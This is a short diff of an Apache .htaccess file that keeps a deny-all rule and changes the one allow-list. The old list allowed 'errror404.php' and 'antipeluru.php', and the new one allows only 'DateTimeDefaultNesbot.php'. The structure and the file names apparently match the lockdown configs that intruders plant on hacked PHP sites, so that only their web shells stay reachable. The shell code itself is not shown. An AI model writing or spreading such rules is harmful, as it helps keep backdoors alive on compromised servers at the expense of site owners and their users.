@@ -3,7 +3,8 @@ Order allow,deny
 Deny from all
 </FilesMatch>
 
-<FilesMatch "^(errror404.php||index.php|antipeluru.php)$">
+<FilesMatch "^(DateTimeDefaultNesbot.php)$">
 Order allow,deny
 Allow from all
+
 </FilesMatch>
